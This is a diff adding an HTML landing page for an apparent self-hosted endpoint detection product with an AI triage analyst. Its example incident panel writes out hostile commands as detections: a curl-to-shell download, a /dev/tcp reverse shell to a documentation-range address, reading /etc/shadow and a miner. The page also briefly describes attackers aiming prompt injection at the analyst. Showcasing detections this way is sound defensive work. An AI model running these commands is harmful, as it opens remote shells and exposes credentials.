@@ -1,0 +1,224 @@
+<title>Postern Cyber</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<meta name="description" content="Postern Cyber: self-hosted endpoint detection and response with an AI analyst powered by Claude Mythos 5.2 through your own API key.">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Bricolage+Grotesque:opsz,wght@12..96,500;12..96,700&family=IBM+Plex+Mono:wght@400;500&family=IBM+Plex+Sans:wght@400;500;600&display=swap">
+<style>
+/* Layout: left-aligned editorial column on weathered stone; the one loud element is the
+   arched "postern" panel in the hero that holds a real incident storyline. */
+:root{
+  --stone:#eceee9; --wall:#f9faf7; --ink:#15211f; --mute:#566360; --line:#c9d1ca;
+  --verdigris:#1c6a58; --verdigris-ink:#ffffff; --signal:#a85d00;
+  --crit:#b3172f; --high:#b1560d; --med:#7c6200;
+  --display:"Bricolage Grotesque","Arial Narrow",system-ui,sans-serif;
+  --body:"IBM Plex Sans",system-ui,-apple-system,"Segoe UI",sans-serif;
+  --mono:"IBM Plex Mono",ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+}
+@media (prefers-color-scheme: dark){ :root:not([data-theme="light"]){
+  --stone:#111817; --wall:#18211f; --ink:#e5ece8; --mute:#93a19c; --line:#2c3a37;
+  --verdigris:#62c9aa; --verdigris-ink:#08231c; --signal:#f0aa4b;
+  --crit:#ff6b7c; --high:#ff9c55; --med:#e8c44f; color-scheme:dark } }
+:root[data-theme="dark"]{
+  --stone:#111817; --wall:#18211f; --ink:#e5ece8; --mute:#93a19c; --line:#2c3a37;
+  --verdigris:#62c9aa; --verdigris-ink:#08231c; --signal:#f0aa4b;
+  --crit:#ff6b7c; --high:#ff9c55; --med:#e8c44f; color-scheme:dark }
+
+*{box-sizing:border-box}
+body{background:var(--stone);color:var(--ink);font:400 17px/1.6 var(--body);margin:0}
+.band{padding-left:max(16px,env(safe-area-inset-left,0px));padding-right:max(16px,env(safe-area-inset-right,0px));padding-block:72px}
+.band.tight{padding-block:20px}
+.band.alt{background:var(--wall);border-block:1px solid var(--line)}
+.in{max-width:1120px;margin:0 auto}
+a{color:var(--verdigris)}
+a:focus-visible,.btn:focus-visible{outline:2px solid var(--signal);outline-offset:3px}
+h1,h2,h3{font-family:var(--display);text-wrap:balance;margin:0;letter-spacing:-.015em}
+h1{font-size:clamp(2.5rem,6.2vw,4.6rem);line-height:.98;font-weight:700}
+h2{font-size:clamp(1.8rem,3.6vw,2.6rem);line-height:1.05;font-weight:700}
+h3{font-size:1.15rem;font-weight:700;letter-spacing:0}
+p{margin:0;max-width:62ch}
+.eyebrow{font:500 .78rem/1 var(--mono);letter-spacing:.14em;text-transform:uppercase;color:var(--signal)}
+.lede{font-size:1.2rem;color:var(--mute)}
+.mono{font-family:var(--mono);font-size:.82em}
+
+.top{display:flex;align-items:center;justify-content:space-between;gap:16px;flex-wrap:wrap}
+.logo{font:700 1.15rem var(--display);letter-spacing:.02em;display:flex;align-items:center;gap:10px}
+.logo svg{width:22px;height:28px}
+.top nav{display:flex;gap:22px;flex-wrap:wrap;font-size:.95rem}
+.top nav a{color:var(--ink);text-decoration:none}.top nav a:hover{color:var(--verdigris)}
+
+.hero{display:grid;grid-template-columns:minmax(0,1.05fr) minmax(0,.95fr);gap:56px;align-items:end}
+.hero-copy{display:flex;flex-direction:column;gap:24px;padding-bottom:12px}
+.cta{display:flex;gap:12px;flex-wrap:wrap;align-items:center}
+.btn{display:inline-block;padding:12px 20px;border-radius:4px;font-weight:600;text-decoration:none;border:1.5px solid var(--ink);color:var(--ink)}
+.btn.solid{background:var(--verdigris);border-color:var(--verdigris);color:var(--verdigris-ink)}
+.btn:hover{transform:translateY(-1px)}
+.facts{display:flex;gap:28px;flex-wrap:wrap;font:.85rem var(--mono);color:var(--mute);padding-top:8px;border-top:1px solid var(--line)}
+.facts b{color:var(--ink);font-weight:500}
+
+/* The postern: an arched doorway holding one correlated incident. */
+.postern{background:var(--wall);border:1.5px solid var(--ink);border-radius:min(260px,46vw) min(260px,46vw) 6px 6px;padding:92px 26px 24px;min-width:0}
+.postern header{text-align:center;display:flex;flex-direction:column;gap:6px;align-items:center;margin-bottom:20px}
+.postern header b{font:700 1.3rem var(--display)}
+.pill{display:inline-block;font:500 .7rem/1 var(--mono);letter-spacing:.08em;text-transform:uppercase;padding:4px 8px;border:1px solid currentColor;border-radius:99px}
+.pill.crit{color:var(--crit)}.pill.high{color:var(--high)}.pill.med{color:var(--med)}.pill.ok{color:var(--verdigris)}
+.story{list-style:none;margin:0;padding:0;display:flex;flex-direction:column}
+.story li{display:grid;grid-template-columns:64px minmax(0,1fr);gap:12px;padding:9px 0;border-top:1px dashed var(--line);font-size:.86rem}
+.story time{font:.76rem var(--mono);color:var(--mute);padding-top:2px}
+.story .what{display:flex;flex-direction:column;gap:3px;min-width:0}
+.story code{font:.76rem var(--mono);color:var(--mute);overflow-wrap:anywhere}
+.story .row{display:flex;gap:8px;align-items:center;flex-wrap:wrap}
+.verdict{margin-top:14px;padding:14px;border:1.5px solid var(--verdigris);border-radius:4px;font-size:.88rem;display:flex;flex-direction:column;gap:6px}
+.verdict .row{display:flex;gap:8px;align-items:center;flex-wrap:wrap}
+.note{font:.72rem var(--mono);color:var(--mute);text-align:center;margin-top:10px}
+
+.head{display:flex;flex-direction:column;gap:14px;margin-bottom:40px}
+.caps{display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:0;border-top:1.5px solid var(--ink)}
+.caps article{padding:22px 22px 26px 0;border-bottom:1px solid var(--line);display:flex;flex-direction:column;gap:8px}
+.caps p{font-size:.95rem;color:var(--mute)}
+.caps .k{font:.72rem var(--mono);letter-spacing:.1em;text-transform:uppercase;color:var(--verdigris)}
+
+.split{display:grid;grid-template-columns:minmax(0,1fr) minmax(0,1fr);gap:48px;align-items:start}
+.jobs{display:flex;flex-direction:column;gap:22px}
+.jobs div{display:flex;flex-direction:column;gap:4px;padding-left:16px;border-left:2px solid var(--verdigris)}
+.jobs p,.guard p{font-size:.97rem;color:var(--mute)}
+.guard{border:1.5px solid var(--ink);padding:26px;border-radius:4px;display:flex;flex-direction:column;gap:16px;background:var(--stone)}
+.guard ul{margin:0;padding-left:18px;display:flex;flex-direction:column;gap:10px;font-size:.95rem}
+
+.steps{display:grid;grid-template-columns:repeat(auto-fit,minmax(290px,1fr));gap:24px;counter-reset:s}
+.steps article{display:flex;flex-direction:column;gap:10px;min-width:0;counter-increment:s}
+.steps h3::before{content:counter(s) ". ";color:var(--signal)}
+.steps p{font-size:.95rem;color:var(--mute)}
+pre{margin:0;background:var(--ink);color:var(--stone);padding:14px 16px;border-radius:4px;font:.78rem/1.55 var(--mono);overflow-x:auto;white-space:pre}
+
+.scroll{overflow-x:auto}
+table{width:100%;border-collapse:collapse;font-size:.95rem;min-width:560px}
+th{text-align:left;font:500 .72rem var(--mono);letter-spacing:.1em;text-transform:uppercase;color:var(--mute);padding:10px 14px 10px 0;border-bottom:1.5px solid var(--ink)}
+td{padding:12px 14px 12px 0;border-bottom:1px solid var(--line);vertical-align:top}
+td:first-child{font-weight:600;white-space:nowrap}
+
+.contact{display:flex;justify-content:space-between;gap:32px;flex-wrap:wrap;align-items:end}
+.addr{font:500 1.15rem var(--mono);user-select:all}
+footer{font-size:.85rem;color:var(--mute);display:flex;justify-content:space-between;gap:16px;flex-wrap:wrap}
+
+@media (max-width:860px){ .hero,.split{grid-template-columns:minmax(0,1fr)} .band{padding-block:52px} .postern{padding-top:76px} }
+@media (prefers-reduced-motion:reduce){ .btn:hover{transform:none} }
+</style>
+
+<div class="band tight"><div class="in top">
+  <div class="logo">
+    <svg viewBox="0 0 22 28" aria-hidden="true"><path d="M1.5 27V11a9.5 9.5 0 0 1 19 0v16z" fill="none" stroke="currentColor" stroke-width="2"/><circle cx="14.5" cy="17" r="1.6" fill="currentColor"/></svg>
+    POSTERN CYBER
+  </div>
+  <nav><a href="#coverage">Coverage</a><a href="#analyst">AI analyst</a><a href="#deploy">Deploy</a><a href="#status">Status</a></nav>
+</div></div>
+
+<div class="band" style="padding-top:36px"><div class="in hero">
+  <div class="hero-copy">
+    <span class="eyebrow">Endpoint detection &amp; response · self-hosted</span>
+    <h1>Watch the small gate. That is the one they use.</h1>
+    <p class="lede">Postern Cyber puts a sensor on every Linux and macOS host, correlates what it sees into one incident, and hands the investigation to an AI analyst running on Claude Mythos 5.2 through your own Anthropic API key. Your telemetry stays on your server.</p>
+    <div class="cta"><a class="btn solid" href="#deploy">Deploy in three steps</a><a class="btn" href="#status">See what ships today</a></div>
+    <div class="facts"><span><b>31</b> built-in detections</span><span><b>MITRE ATT&amp;CK</b> mapped</span><span><b>2</b> static binaries</span><span><b>0</b> telemetry leaves your infra</span></div>
+  </div>
+
+  <aside class="postern" aria-label="Example incident">
+    <header>
+      <span class="pill crit">critical · open</span>
+      <b>Incident #1 · web-01</b>
+      <span class="mono" style="color:var(--mute)">10 alerts joined into one storyline</span>
+    </header>
+    <ol class="story">
+      <li><time>14:02:07</time><div class="what"><div class="row"><span class="pill crit">PC-EXE-007</span><span>Web server spawned a shell</span></div><code>php-fpm → sh -c id; uname -a</code></div></li>
+      <li><time>14:02:09</time><div class="what"><div class="row"><span class="pill high">PC-EXE-004</span><span>Download piped into a shell</span></div><code>curl -fsSL http://203.0.113.50/s.sh | sh</code></div></li>
+      <li><time>14:02:11</time><div class="what"><div class="row"><span class="pill crit">PC-EXE-001</span><span>Reverse shell · T1059.004</span></div><code>bash -i &gt;&amp; /dev/tcp/203.0.113.50/4444</code></div></li>
+      <li><time>14:03:40</time><div class="what"><div class="row"><span class="pill high">PC-CRED-001</span><span>Credential store read · T1003.008</span></div><code>cat /etc/shadow</code></div></li>
+      <li><time>14:04:02</time><div class="what"><div class="row"><span class="pill high">PC-PER-001</span><span>authorized_keys modified · T1098.004</span></div><code>/root/.ssh/authorized_keys</code></div></li>
+      <li><time>14:05:18</time><div class="what"><div class="row"><span class="pill high">PC-IMP-001</span><span>Cryptocurrency miner · T1496</span></div><code>/tmp/kdevtmpfsi -o stratum+tcp://…:3333</code></div></li>
+    </ol>
+    <div class="verdict">
+      <div class="row"><span class="pill ok">AI verdict</span><b>true positive</b><span class="mono">claude-mythos-5-2</span></div>
+      <span>Remote code execution through the PHP application led to a root shell, a planted SSH key and a miner. Recommended: isolate web-01, kill pid 4240, quarantine /tmp/kdevtmpfsi.</span>
+      <span class="mono" style="color:var(--mute)">Each action waits for an operator to approve it.</span>
+    </div>
+    <p class="note">Illustration built from the product's demo scenario.</p>
+  </aside>
+</div></div>
+
+<div class="band alt" id="coverage"><div class="in">
+  <div class="head"><span class="eyebrow">Coverage</span><h2>What an enterprise endpoint platform does, in a codebase you can read.</h2></div>
+  <div class="caps">
+    <article><span class="k">Sensor</span><h3>Endpoint telemetry</h3><p>Process starts with parent lineage, user and SHA-256. New outbound connections and listening ports. SSH and sudo authentication.</p></article>
+    <article><span class="k">Detect</span><h3>Behavioral detections</h3><p>31 rules for reverse shells, web shells, credential access, persistence, miners, tunnelling and log tampering. Write your own in YAML.</p></article>
+    <article><span class="k">Correlate</span><h3>Incident storyline</h3><p>Alerts on one host inside a 30-minute window join a single incident, so an intrusion reads as one case instead of ten pages.</p></article>
+    <article><span class="k">Respond</span><h3>Containment</h3><p>Kill a process, quarantine a file, isolate a host from the network with nftables. Manual by default; automatic per host in protect mode.</p></article>
+    <article><span class="k">Integrity</span><h3>File integrity monitoring</h3><p>Account databases, sudoers, SSH keys, cron, systemd units and the dynamic linker preload are hashed and watched for change.</p></article>
+    <article><span class="k">Intel</span><h3>Indicator matching</h3><p>Load file hashes and addresses. A running process or connection that matches raises a high-severity alert.</p></article>
+    <article><span class="k">Posture</span><h3>Exposure checks</h3><p>SSH hardening, firewall state, ASLR, pending updates, disk encryption, extra uid 0 accounts and package inventory per host.</p></article>
+    <article><span class="k">XDR</span><h3>Third-party ingestion</h3><p>Post firewall, cloud or identity logs to one API endpoint. They run through the same detections and land in the same incidents.</p></article>
+    <article><span class="k">Govern</span><h3>Audit trail</h3><p>Every response action, rule change, enrollment and AI request is recorded with who asked for it.</p></article>
+  </div>
+</div></div>
+
+<div class="band" id="analyst"><div class="in">
+  <div class="head"><span class="eyebrow">AI analyst</span><h2>Claude Mythos 5.2 reads the case file. You sign the order.</h2>
+    <p class="lede">Paste an Anthropic API key in Settings and the console gains an analyst. Mythos 5.2 is available to verified organizations; any other Claude model id works in the same field.</p></div>
+  <div class="split">
+    <div class="jobs">
+      <div><h3>Triage an incident</h3><p>One click sends the alerts and the surrounding telemetry. Back comes a verdict, a confidence figure, a narrative that cites event ids, ATT&amp;CK techniques and a list of actions to approve.</p></div>
+      <div><h3>Hunt in plain language</h3><p>Ask "did anything on the database hosts open a new listener this week?" The model queries your event store with read-only tools and shows every query it ran.</p></div>
+      <div><h3>Draft a detection</h3><p>Describe a behaviour. You get a validated rule, the reasoning behind it and the false positives to expect. It goes live only when you save it.</p></div>
+    </div>
+    <div class="guard">
+      <h3>Built for an adversarial input</h3>
+      <p>Command lines and file names are written by the attacker. The integration assumes they will try to talk to the model.</p>
+      <ul>
+        <li>Telemetry reaches the model as tagged data, with standing instructions to treat it as evidence and never as a request.</li>
+        <li>The model has no tool that changes anything. It recommends; an operator approves each action in the console.</li>
+        <li>The console escapes every value it renders, so a hostile string cannot run script in the analyst's browser.</li>
+        <li>If a request is declined by a safety classifier, the server says so plainly and can re-run it on Anthropic's recommended fallback model.</li>
+      </ul>
+    </div>
+  </div>
+</div></div>
+
+<div class="band alt" id="deploy"><div class="in">
+  <div class="head"><span class="eyebrow">Deploy</span><h2>One server, one sensor per host, one key.</h2></div>
+  <div class="steps">
+    <article><h3>Start the server</h3><p>A single binary with an embedded database and console. It writes an admin token on first start.</p>
+<pre>postern-server \
+  --listen 127.0.0.1:8460 \
+  --data-dir /var/lib/postern</pre></article>
+    <article><h3>Enroll a sensor</h3><p>Observe-only unless you grant response capabilities on that host.</p>
+<pre>postern-sensor \
+  --server https://console.example.com \
+  --enroll-token pce_… \
+  --response kill,quarantine,isolate</pre></article>
+    <article><h3>Connect the analyst</h3><p>Set the key in the console, or keep it out of the database entirely.</p>
+<pre>export ANTHROPIC_API_KEY=sk-ant-…
+export POSTERN_AI_MODEL=claude-mythos-5-2</pre></article>
+  </div>
+</div></div>
+
+<div class="band" id="status"><div class="in">
+  <div class="head"><span class="eyebrow">Status · version 0.1</span><h2>What ships today, and what does not yet.</h2>
+    <p class="lede">Postern Cyber is in private preview. This table is the full picture, so you can judge it against the platform you run now.</p></div>
+  <div class="scroll"><table>
+    <thead><tr><th>Area</th><th>In 0.1</th><th>Planned</th></tr></thead>
+    <tbody>
+      <tr><td>Platforms</td><td>Linux and macOS sensors</td><td>Windows sensor</td></tr>
+      <tr><td>Telemetry</td><td>Polling every 2 to 30 seconds; very short-lived processes can be missed</td><td>Kernel-level events through eBPF</td></tr>
+      <tr><td>Prevention</td><td>Kill, quarantine and isolate after detection</td><td>Blocking before execution</td></tr>
+      <tr><td>Ransomware</td><td>Detection of bulk encryption and shredding commands</td><td>Snapshot rollback</td></tr>
+      <tr><td>Exposure</td><td>Posture checks and package inventory</td><td>CVE matching against the inventory</td></tr>
+      <tr><td>Cloud &amp; identity</td><td>Log ingestion through the API</td><td>Native cloud and identity-provider connectors</td></tr>
+      <tr><td>Console access</td><td>Bearer tokens and API keys</td><td>Single sign-on and role-based access</td></tr>
+      <tr><td>Assurance</td><td>Unit tests and an end-to-end demo scenario</td><td>Independent security audit</td></tr>
+    </tbody>
+  </table></div>
+</div></div>
+
+<div class="band alt"><div class="in contact">
+  <div class="head" style="margin:0"><span class="eyebrow">Private preview</span><h2>Ask for access.</h2><p>Tell us how many hosts you run and which platforms. We reply with a build and an enrollment token.</p></div>
+  <span class="addr">access@posterncyber.com</span>
+</div></div>
+
+<div class="band tight"><div class="in"><footer><span>© 2026 Postern Cyber</span><span>posterncyber.com</span></footer></div></div>
